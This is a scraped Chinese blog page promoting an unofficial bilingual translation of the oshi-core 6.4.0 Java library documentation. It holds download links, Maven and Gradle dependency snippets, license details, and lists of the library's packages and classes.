            com.github.oshi : oshi-core ä¸­æ–‡æ–‡æ¡£ï¼ˆä¸­è‹±å¯¹ç…§Â·APIÂ·æ¥å£Â·æ“ä½œæ‰‹å†ŒÂ·å…¨ç‰ˆæœ¬ï¼‰ä»¥6.4.0ä¸ºä¾‹ï¼Œå«Mavenä¾èµ–ã€jaråŒ…ã€æºç 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2840793777967512/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯’æ°´é¦¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:16:45.000Z" title="Fri Jan 02 2026 06:16:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®Œæ•´æ–‡æ¡£ä¸‹è½½åœ°å€ï¼ˆç±»ã€æ–¹æ³•ã€å‚æ•°è¯´æ˜ï¼‰</h2>
<ul>
<li><strong>oshi-core-6.4.0.jarä¸­æ–‡-è‹±æ–‡å¯¹ç…§æ–‡æ¡£.zip</strong> ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2FfileDetails%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core%26version%3D6.4.0" target="_blank" title="https://hanshuixin.org/resource/fileDetails?groupId=com.github.oshi&amp;artifactId=oshi-core&amp;version=6.4.0" ref="nofollow noopener noreferrer">hanshuixin.org/resource/fiâ€¦</a></li>
<li><strong>oshi-core å…¶ä»–ç‰ˆæœ¬ä¸­æ–‡æ–‡æ¡£</strong> ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2F%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core" target="_blank" title="https://hanshuixin.org/resource/?groupId=com.github.oshi&amp;artifactId=oshi-core" ref="nofollow noopener noreferrer">hanshuixin.org/resource/?gâ€¦</a></li>
</ul>
<h2 data-id="heading-1">oshi-core-6.4.0.jarä¸­æ–‡-è‹±æ–‡å¯¹ç…§æ–‡æ¡£.zip ä¸­åŒ…å«ä»¥ä¸‹å†…å®¹</h2>
<ol>
<li>ä¸­æ–‡-è‹±æ–‡å¯¹ç…§<strong>æ–‡æ¡£</strong>ï¼šä½äºå‹ç¼©åŒ…å†…çš„â€œæ–‡æ¡£â€æ–‡ä»¶å¤¹ä¸­</li>
<li><strong>è¯´æ˜æ–‡ä»¶</strong>ï¼šä½¿ç”¨è¯´æ˜.txtã€README.md</li>
<li><strong>Maven</strong>ä¾èµ–ï¼šoshi-core-6.4.0.jar Mavenä¾èµ–ä¿¡æ¯(å¯ç”¨äºé¡¹ç›®pom.xml).txt</li>
<li><strong>Gradle</strong>ä¾èµ–ï¼šoshi-core-6.4.0.jar Gradleä¾èµ–ä¿¡æ¯(å¯ç”¨äºé¡¹ç›®build.gradle).txt</li>
<li><strong>jaråŒ…</strong>ä¸‹è½½åœ°å€ï¼šoshi-core-6.4.0.jarä¸‹è½½åœ°å€(å®˜æ–¹åœ°å€+å›½å†…é•œåƒåœ°å€).txt</li>
<li><strong>æºç </strong>ä¸‹è½½åœ°å€ï¼šoshi-core-6.4.0-sources.jarä¸‹è½½åœ°å€(å®˜æ–¹åœ°å€+å›½å†…é•œåƒåœ°å€).txt</li>
</ol>
<h2 data-id="heading-2">ä½¿ç”¨æ–¹æ³•</h2>
<ol>
<li>è§£å‹ <strong>oshi-core-6.4.0.jarä¸­æ–‡-è‹±æ–‡å¯¹ç…§æ–‡æ¡£.zip</strong>ï¼Œæ‰¾åˆ° è§£å‹åçš„æ–‡ä»¶å¤¹&gt;æ–‡æ¡£&gt;index.htmlï¼ŒåŒå‡»index.htmlå³å¯ç”¨æµè§ˆå™¨æ‰“å¼€æŸ¥çœ‹ã€‚</li>
<li>ä¸ºäº†é˜²æ­¢è§£å‹åè·¯å¾„å¤ªé•¿å¯¼è‡´æµè§ˆå™¨æ— æ³•æ‰“å¼€ï¼Œæ¨èåœ¨è§£å‹æ—¶é€‰æ‹©â€œè§£å‹åˆ°å½“å‰æ–‡ä»¶å¤¹â€ï¼ˆæ”¾å¿ƒï¼Œè‡ªå¸¦æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶ä¸ä¼šæ•£è½ä¸€åœ°ï¼‰ã€‚</li>
<li>æœ‰æ—¶ï¼Œä¸€å¥—Javaç»„ä»¶ä¼šæœ‰å¤šä¸ªjarï¼Œæ‰€ä»¥åœ¨ä¸‹è½½å‰ï¼Œè¯·ä»”ç»†é˜…è¯»æœ¬ç¯‡æè¿°ï¼Œä»¥ç¡®ä¿è¿™å°±æ˜¯ä½ éœ€è¦çš„æ–‡ä»¶ã€‚</li>
</ol>
<h2 data-id="heading-3">ç»„ä»¶ä¿¡æ¯</h2>
<h3 data-id="heading-4">ç®€ä»‹</h3>
<ul>
<li><strong>åç§°ï¼š</strong> oshi-core</li>
<li><strong>æè¿°ï¼š</strong> com.github.oshi - oshi-core</li>
<li><strong>ç‰ˆæœ¬ï¼š</strong> 6.4.0</li>
</ul>
<h3 data-id="heading-5">Mavenä¾èµ–</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.oshi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>oshi-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span> 
</code></pre>
<h3 data-id="heading-6">Gradleä¾èµ–</h3>
<pre><code class="hljs language-text" lang="text">Gradle:
	implementation group: 'com.github.oshi', name: 'oshi-core', version: '6.4.0'
Gradle (Short):
	implementation 'com.github.oshi:oshi-core:6.4.0'
Gradle (Kotlin):
	implementation("com.github.oshi:oshi-core:6.4.0") 
</code></pre>
<h2 data-id="heading-7">å¯’æ°´é¦¨ Java ç»„ä»¶ä¸­æ–‡æ–‡æ¡£ç³»åˆ—è¯´æ˜</h2>
<ul>
<li>æ–‡æ¡£ä¸º Java ç»„ä»¶çš„ä¸­æ–‡ç¿»è¯‘æ–‡æ¡£</li>
<li>æ–‡æ¡£ç”± <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org" target="_blank" title="https://hanshuixin.org" ref="nofollow noopener noreferrer">å¯’æ°´é¦¨</a></strong> ç¿»è¯‘æ•´ç†ï¼Œéå®˜æ–¹ç‰ˆæœ¬</li>
<li>æœ¬ç³»åˆ—æ–‡æ¡£è·å–åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org" target="_blank" title="https://hanshuixin.org" ref="nofollow noopener noreferrer">hanshuixin.org</a></li>
<li>æœ¬æ–‡æ¡£ä¸ºäººæ€§åŒ–ç¿»è¯‘ï¼Œç²¾å¿ƒåˆ¶ä½œï¼Œè¯·æ”¾å¿ƒä½¿ç”¨</li>
<li>æœ¬æ–‡æ¡£ä¸ºåŒè¯­åŒæ—¶å±•ç¤ºï¼Œä¸€è¡ŒåŸæ–‡ã€ä¸€è¡Œè¯‘æ–‡ï¼Œå¯é€è¡Œå¯¹ç…§ï¼Œé¿å…äº†åŸæ–‡/è¯‘æ–‡æ¥å›åˆ‡æ¢çš„éº»çƒ¦</li>
<li>æœ‰åŸæ–‡å¯å‚ç…§ï¼Œä¸å†æ‹…å¿ƒç¿»è¯‘åå·®è¯¯å¯¼</li>
<li>è¾¹å­¦æŠ€æœ¯ã€è¾¹å­¦è‹±è¯­</li>
<li>åªç¿»è¯‘äº†è¯¥ç¿»è¯‘çš„å†…å®¹ï¼Œå¦‚ï¼šæ³¨é‡Šã€è¯´æ˜ã€æè¿°ã€ç”¨æ³•è®²è§£ ç­‰</li>
<li>ä¸è¯¥ç¿»è¯‘çš„å†…å®¹ä¿æŒåŸæ ·ï¼Œå¦‚ï¼šç±»åã€æ–¹æ³•åã€åŒ…åã€ç±»å‹ã€å…³é”®å­—ã€ä»£ç  ç­‰</li>
</ul>
<h2 data-id="heading-8">ç‰ˆæƒå£°æ˜ä¸æ¥æºä¿¡æ¯</h2>
<p>æœ¬ç¿»è¯‘æ–‡æ¡£åŸºäºä»¥ä¸‹å¼€æºé¡¹ç›®åˆ¶ä½œï¼Œä¸¥æ ¼éµå®ˆå„é¡¹ç›®çš„å¼€æºè®¸å¯è¯ï¼Œå¹¶åœ¨æ­¤åˆ—å‡ºå…¶ç‰ˆæƒå½’å±ä¸è®¸å¯è¯ä¿¡æ¯ã€‚</p>
<ul>
<li>ç»„ä»¶ GAV åæ ‡ï¼šcom.github.oshi:oshi-core:6.4.0</li>
<li>åŸå§‹é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcentral.sonatype.com%2Fartifact%2Fcom.github.oshi%2Foshi-core%2F6.4.0" target="_blank" title="https://central.sonatype.com/artifact/com.github.oshi/oshi-core/6.4.0" ref="nofollow noopener noreferrer">central.sonatype.com/artifact/coâ€¦</a></li>
<li>è®¸å¯è¯ï¼šSPDX-License-Identifier: MIT</li>
<li>è®¸å¯è¯é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopensource.org%2Flicenses%2FMIT" target="_blank" title="https://opensource.org/licenses/MIT" ref="nofollow noopener noreferrer">opensource.org/licenses/MIâ€¦</a></li>
<li>æ‰€æœ‰åŸå§‹ä»£ç åŠæ³¨é‡Šç‰ˆæƒå½’å…¶åŸä½œè€…æ‰€æœ‰</li>
<li>æœ¬ç¿»è¯‘å†…å®¹çš„ç‰ˆæƒå½’ <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org" target="_blank" title="https://hanshuixin.org" ref="nofollow noopener noreferrer">å¯’æ°´é¦¨</a></strong> æ‰€æœ‰ï¼ˆÂ© 2025 å¯’æ°´é¦¨ï¼‰ï¼Œæœªç»è®¸å¯ä¸å¾—ç”¨äºäºŒæ¬¡åˆ†å‘æˆ–å†é”€å”®</li>
</ul>
<h2 data-id="heading-9">æœ¬ç»„ä»¶åŒ…å«çš„ Java packageï¼ˆåŒ…ï¼‰</h2>
<pre><code class="hljs language-text" lang="text">oshi
oshi.annotation.concurrent
oshi.driver.linux
oshi.driver.linux.proc
oshi.driver.mac
oshi.driver.mac.disk
oshi.driver.mac.net
oshi.driver.unix
oshi.driver.unix.aix
oshi.driver.unix.aix.perfstat
oshi.driver.unix.freebsd
oshi.driver.unix.freebsd.disk
oshi.driver.unix.openbsd.disk
oshi.driver.unix.solaris
oshi.driver.unix.solaris.disk
oshi.driver.unix.solaris.kstat
oshi.driver.windows
oshi.driver.windows.perfmon
oshi.driver.windows.registry
oshi.driver.windows.wmi
oshi.hardware
oshi.hardware.common
oshi.hardware.platform.linux
oshi.hardware.platform.mac
oshi.hardware.platform.unix
oshi.hardware.platform.unix.aix
oshi.hardware.platform.unix.freebsd
oshi.hardware.platform.unix.openbsd
oshi.hardware.platform.unix.solaris
oshi.hardware.platform.windows
oshi.jna
oshi.jna.platform.linux
oshi.jna.platform.mac
oshi.jna.platform.unix
oshi.jna.platform.windows
oshi.software.common
oshi.software.os
oshi.software.os.linux
oshi.software.os.mac
oshi.software.os.unix.aix
oshi.software.os.unix.freebsd
oshi.software.os.unix.openbsd
oshi.software.os.unix.solaris
oshi.software.os.windows
oshi.util
oshi.util.platform.linux
oshi.util.platform.mac
oshi.util.platform.unix.freebsd
oshi.util.platform.unix.openbsd
oshi.util.platform.unix.solaris
oshi.util.platform.windows
oshi.util.tuples 
</code></pre>
<h2 data-id="heading-10">æœ¬ç»„ä»¶åŒ…å«çš„ Java classï¼ˆç±»ï¼‰</h2>
<pre><code class="hljs language-text" lang="text">oshi.PlatformEnum
oshi.SystemInfo
oshi.annotation.concurrent.GuardedBy
oshi.annotation.concurrent.Immutable
oshi.annotation.concurrent.NotThreadSafe
oshi.annotation.concurrent.ThreadSafe
oshi.driver.linux.Devicetree
oshi.driver.linux.Dmidecode
oshi.driver.linux.Lshal
oshi.driver.linux.Lshw
oshi.driver.linux.Sysfs
oshi.driver.linux.Who
oshi.driver.linux.proc.Auxv
oshi.driver.linux.proc.CpuInfo
oshi.driver.linux.proc.CpuStat
oshi.driver.linux.proc.DiskStats
oshi.driver.linux.proc.DiskStats.IoStat
oshi.driver.linux.proc.ProcessStat
oshi.driver.linux.proc.ProcessStat.PidStat
oshi.driver.linux.proc.ProcessStat.PidStatM
oshi.driver.linux.proc.UpTime
oshi.driver.mac.ThreadInfo
oshi.driver.mac.ThreadInfo.ThreadStats
oshi.driver.mac.Who
oshi.driver.mac.WindowInfo
oshi.driver.mac.disk.Fsstat
oshi.driver.mac.net.NetStat
oshi.driver.mac.net.NetStat.IFdata
oshi.driver.unix.NetStat
oshi.driver.unix.Who
oshi.driver.unix.Xrandr
oshi.driver.unix.Xwininfo
oshi.driver.unix.aix.Ls
oshi.driver.unix.aix.Lscfg
oshi.driver.unix.aix.Lspv
oshi.driver.unix.aix.Lssrad
oshi.driver.unix.aix.PsInfo
oshi.driver.unix.aix.Uptime
oshi.driver.unix.aix.Who
oshi.driver.unix.aix.perfstat.PerfstatConfig
oshi.driver.unix.aix.perfstat.PerfstatCpu
oshi.driver.unix.aix.perfstat.PerfstatDisk
oshi.driver.unix.aix.perfstat.PerfstatMemory
oshi.driver.unix.aix.perfstat.PerfstatNetInterface
oshi.driver.unix.aix.perfstat.PerfstatProcess
oshi.driver.unix.aix.perfstat.PerfstatProtocol
oshi.driver.unix.freebsd.Who
oshi.driver.unix.freebsd.disk.GeomDiskList
oshi.driver.unix.freebsd.disk.GeomPartList
oshi.driver.unix.freebsd.disk.Mount
oshi.driver.unix.openbsd.disk.Disklabel
oshi.driver.unix.solaris.PsInfo
oshi.driver.unix.solaris.Who
oshi.driver.unix.solaris.disk.Iostat
oshi.driver.unix.solaris.disk.Lshal
oshi.driver.unix.solaris.disk.Prtvtoc
oshi.driver.unix.solaris.kstat.SystemPages
oshi.driver.windows.DeviceTree
oshi.driver.windows.EnumWindows
oshi.driver.windows.LogicalProcessorInformation
oshi.driver.windows.perfmon.LoadAverage
oshi.driver.windows.perfmon.MemoryInformation
oshi.driver.windows.perfmon.MemoryInformation.PageSwapProperty
oshi.driver.windows.perfmon.PagingFile
oshi.driver.windows.perfmon.PagingFile.PagingPercentProperty
oshi.driver.windows.perfmon.PerfmonConstants
oshi.driver.windows.perfmon.PerfmonDisabled
oshi.driver.windows.perfmon.PhysicalDisk
oshi.driver.windows.perfmon.PhysicalDisk.PhysicalDiskProperty
oshi.driver.windows.perfmon.ProcessInformation
oshi.driver.windows.perfmon.ProcessInformation.HandleCountProperty
oshi.driver.windows.perfmon.ProcessInformation.IdleProcessorTimeProperty
oshi.driver.windows.perfmon.ProcessInformation.ProcessPerformanceProperty
oshi.driver.windows.perfmon.ProcessorInformation
oshi.driver.windows.perfmon.ProcessorInformation.InterruptsProperty
oshi.driver.windows.perfmon.ProcessorInformation.ProcessorFrequencyProperty
oshi.driver.windows.perfmon.ProcessorInformation.ProcessorTickCountProperty
oshi.driver.windows.perfmon.ProcessorInformation.ProcessorUtilityTickCountProperty
oshi.driver.windows.perfmon.SystemInformation
oshi.driver.windows.perfmon.SystemInformation.ContextSwitchProperty
oshi.driver.windows.perfmon.SystemInformation.ProcessorQueueLengthProperty
oshi.driver.windows.perfmon.ThreadInformation
oshi.driver.windows.perfmon.ThreadInformation.ThreadPerformanceProperty
oshi.driver.windows.registry.HkeyPerformanceDataUtil
oshi.driver.windows.registry.HkeyUserData
oshi.driver.windows.registry.NetSessionData
oshi.driver.windows.registry.ProcessPerformanceData
oshi.driver.windows.registry.ProcessPerformanceData.PerfCounterBlock
oshi.driver.windows.registry.ProcessWtsData
oshi.driver.windows.registry.ProcessWtsData.WtsInfo
oshi.driver.windows.registry.SessionWtsData
oshi.driver.windows.registry.ThreadPerformanceData
oshi.driver.windows.registry.ThreadPerformanceData.PerfCounterBlock
oshi.driver.windows.wmi.MSAcpiThermalZoneTemperature
oshi.driver.windows.wmi.MSAcpiThermalZoneTemperature.TemperatureProperty
oshi.driver.windows.wmi.MSFTStorage
oshi.driver.windows.wmi.MSFTStorage.PhysicalDiskProperty
oshi.driver.windows.wmi.MSFTStorage.StoragePoolProperty
oshi.driver.windows.wmi.MSFTStorage.StoragePoolToPhysicalDiskProperty
oshi.driver.windows.wmi.MSFTStorage.VirtualDiskProperty
oshi.driver.windows.wmi.OhmHardware
oshi.driver.windows.wmi.OhmHardware.IdentifierProperty
oshi.driver.windows.wmi.OhmSensor
oshi.driver.windows.wmi.OhmSensor.ValueProperty
oshi.driver.windows.wmi.Win32BaseBoard
oshi.driver.windows.wmi.Win32BaseBoard.BaseBoardProperty
oshi.driver.windows.wmi.Win32Bios
oshi.driver.windows.wmi.Win32Bios.BiosProperty
oshi.driver.windows.wmi.Win32Bios.BiosSerialProperty
oshi.driver.windows.wmi.Win32ComputerSystem
oshi.driver.windows.wmi.Win32ComputerSystem.ComputerSystemProperty
oshi.driver.windows.wmi.Win32ComputerSystemProduct
oshi.driver.windows.wmi.Win32ComputerSystemProduct.ComputerSystemProductProperty
oshi.driver.windows.wmi.Win32DiskDrive
oshi.driver.windows.wmi.Win32DiskDrive.DiskDriveProperty
oshi.driver.windows.wmi.Win32DiskDriveToDiskPartition
oshi.driver.windows.wmi.Win32DiskDriveToDiskPartition.DriveToPartitionProperty
oshi.driver.windows.wmi.Win32DiskPartition
oshi.driver.windows.wmi.Win32DiskPartition.DiskPartitionProperty
oshi.driver.windows.wmi.Win32Fan
oshi.driver.windows.wmi.Win32Fan.SpeedProperty
oshi.driver.windows.wmi.Win32LogicalDisk
oshi.driver.windows.wmi.Win32LogicalDisk.LogicalDiskProperty
oshi.driver.windows.wmi.Win32LogicalDiskToPartition
oshi.driver.windows.wmi.Win32LogicalDiskToPartition.DiskToPartitionProperty
oshi.driver.windows.wmi.Win32OperatingSystem
oshi.driver.windows.wmi.Win32OperatingSystem.OSVersionProperty
oshi.driver.windows.wmi.Win32PhysicalMemory
oshi.driver.windows.wmi.Win32PhysicalMemory.PhysicalMemoryProperty
oshi.driver.windows.wmi.Win32PhysicalMemory.PhysicalMemoryPropertyWin8
oshi.driver.windows.wmi.Win32Process
oshi.driver.windows.wmi.Win32Process.CommandLineProperty
oshi.driver.windows.wmi.Win32Process.ProcessXPProperty
oshi.driver.windows.wmi.Win32ProcessCached
oshi.driver.windows.wmi.Win32Processor
oshi.driver.windows.wmi.Win32Processor.BitnessProperty
oshi.driver.windows.wmi.Win32Processor.ProcessorIdProperty
oshi.driver.windows.wmi.Win32Processor.VoltProperty
oshi.driver.windows.wmi.Win32VideoController
oshi.driver.windows.wmi.Win32VideoController.VideoControllerProperty
oshi.hardware.Baseboard
oshi.hardware.CentralProcessor
oshi.hardware.CentralProcessor.LogicalProcessor
oshi.hardware.CentralProcessor.PhysicalProcessor
oshi.hardware.CentralProcessor.ProcessorCache
oshi.hardware.CentralProcessor.ProcessorCache.Type
oshi.hardware.CentralProcessor.ProcessorIdentifier
oshi.hardware.CentralProcessor.TickType
oshi.hardware.ComputerSystem
oshi.hardware.Display
oshi.hardware.Firmware
oshi.hardware.GlobalMemory
oshi.hardware.GraphicsCard
oshi.hardware.HWDiskStore
oshi.hardware.HWPartition
oshi.hardware.HardwareAbstractionLayer
oshi.hardware.LogicalVolumeGroup
oshi.hardware.NetworkIF
oshi.hardware.NetworkIF.IfOperStatus
oshi.hardware.PhysicalMemory
oshi.hardware.PowerSource
oshi.hardware.PowerSource.CapacityUnits
oshi.hardware.Sensors
oshi.hardware.SoundCard
oshi.hardware.UsbDevice
oshi.hardware.VirtualMemory
oshi.hardware.common.AbstractBaseboard
oshi.hardware.common.AbstractCentralProcessor
oshi.hardware.common.AbstractComputerSystem
oshi.hardware.common.AbstractDisplay
oshi.hardware.common.AbstractFirmware
oshi.hardware.common.AbstractGlobalMemory
oshi.hardware.common.AbstractGraphicsCard
oshi.hardware.common.AbstractHWDiskStore
oshi.hardware.common.AbstractHardwareAbstractionLayer
oshi.hardware.common.AbstractLogicalVolumeGroup
oshi.hardware.common.AbstractNetworkIF
oshi.hardware.common.AbstractPowerSource
oshi.hardware.common.AbstractSensors
oshi.hardware.common.AbstractSoundCard
oshi.hardware.common.AbstractUsbDevice
oshi.hardware.common.AbstractVirtualMemory
oshi.hardware.platform.linux.LinuxGlobalMemory
oshi.hardware.platform.linux.LinuxHWDiskStore
oshi.hardware.platform.linux.LinuxHardwareAbstractionLayer
oshi.hardware.platform.linux.LinuxNetworkIF
oshi.hardware.platform.linux.LinuxPowerSource
oshi.hardware.platform.linux.LinuxUsbDevice
oshi.hardware.platform.mac.MacHWDiskStore
oshi.hardware.platform.mac.MacHardwareAbstractionLayer
oshi.hardware.platform.mac.MacNetworkIF
oshi.hardware.platform.mac.MacPowerSource
oshi.hardware.platform.mac.MacUsbDevice
oshi.hardware.platform.unix.BsdNetworkIF
oshi.hardware.platform.unix.UnixBaseboard
oshi.hardware.platform.unix.UnixDisplay
oshi.hardware.platform.unix.aix.AixHWDiskStore
oshi.hardware.platform.unix.aix.AixHardwareAbstractionLayer
oshi.hardware.platform.unix.aix.AixNetworkIF
oshi.hardware.platform.unix.aix.AixPowerSource
oshi.hardware.platform.unix.aix.AixUsbDevice
oshi.hardware.platform.unix.freebsd.FreeBsdHWDiskStore
oshi.hardware.platform.unix.freebsd.FreeBsdHardwareAbstractionLayer
oshi.hardware.platform.unix.freebsd.FreeBsdPowerSource
oshi.hardware.platform.unix.freebsd.FreeBsdUsbDevice
oshi.hardware.platform.unix.openbsd.OpenBsdCentralProcessor
oshi.hardware.platform.unix.openbsd.OpenBsdComputerSystem
oshi.hardware.platform.unix.openbsd.OpenBsdFirmware
oshi.hardware.platform.unix.openbsd.OpenBsdHWDiskStore
oshi.hardware.platform.unix.openbsd.OpenBsdHardwareAbstractionLayer
oshi.hardware.platform.unix.openbsd.OpenBsdPowerSource
oshi.hardware.platform.unix.openbsd.OpenBsdUsbDevice
oshi.hardware.platform.unix.solaris.SolarisHWDiskStore
oshi.hardware.platform.unix.solaris.SolarisHardwareAbstractionLayer
oshi.hardware.platform.unix.solaris.SolarisNetworkIF
oshi.hardware.platform.unix.solaris.SolarisPowerSource
oshi.hardware.platform.unix.solaris.SolarisUsbDevice
oshi.hardware.platform.windows.WindowsHWDiskStore
oshi.hardware.platform.windows.WindowsHardwareAbstractionLayer
oshi.hardware.platform.windows.WindowsNetworkIF
oshi.hardware.platform.windows.WindowsPowerSource
oshi.hardware.platform.windows.WindowsUsbDevice
oshi.jna.ByRef
oshi.jna.ByRef.CloseableHANDLEByReference
oshi.jna.ByRef.CloseableIntByReference
oshi.jna.ByRef.CloseableLONGLONGByReference
oshi.jna.ByRef.CloseableLongByReference
oshi.jna.ByRef.CloseableNativeLongByReference
oshi.jna.ByRef.CloseablePROCESSENTRY32ByReference
oshi.jna.ByRef.CloseablePointerByReference
oshi.jna.ByRef.CloseableSizeTByReference
oshi.jna.ByRef.CloseableULONGptrByReference
oshi.jna.Struct
oshi.jna.Struct.CloseableHostCpuLoadInfo
oshi.jna.Struct.CloseableMibIfRow
oshi.jna.Struct.CloseableMibIfRow2
oshi.jna.Struct.CloseableMibTcpStats
oshi.jna.Struct.CloseableMibUdpStats
oshi.jna.Struct.CloseablePdhRawCounter
oshi.jna.Struct.CloseablePerformanceInformation
oshi.jna.Struct.CloseableProcTaskAllInfo
oshi.jna.Struct.CloseableProcTaskInfo
oshi.jna.Struct.CloseableRUsageInfoV2
oshi.jna.Struct.CloseableSpDeviceInterfaceData
oshi.jna.Struct.CloseableSpDevinfoData
oshi.jna.Struct.CloseableSysinfo
oshi.jna.Struct.CloseableSystemInfo
oshi.jna.Struct.CloseableTimeval
oshi.jna.Struct.CloseableVMStatistics
oshi.jna.Struct.CloseableVnodePathInfo
oshi.jna.Struct.CloseableXswUsage
oshi.jna.platform.linux.LinuxLibc
oshi.jna.platform.linux.LinuxLibc.Exit_status
oshi.jna.platform.linux.LinuxLibc.LinuxUtmpx
oshi.jna.platform.linux.LinuxLibc.Ut_Tv
